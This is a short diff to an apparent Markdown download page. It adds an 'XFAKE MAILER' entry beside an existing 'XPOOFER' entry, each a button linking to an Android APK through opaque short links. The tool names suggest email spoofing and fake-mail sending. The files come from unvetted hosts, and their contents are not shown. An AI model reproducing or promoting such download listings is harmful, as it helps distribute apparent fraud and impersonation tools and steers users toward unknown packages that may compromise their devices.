@@ -10,3 +10,6 @@ layout: default
 
 ## XPOOFER
 - <a class="button no-decoration" href="https://iplis.ru/2YTN27.apk">v1.0.1 [LATEST]</a>
+
+## XFAKE MAILER
+- <a class="button no-decoration" href="https://2no.co/2PMDB6.apk">v1.0-alpha [LATEST]</a>
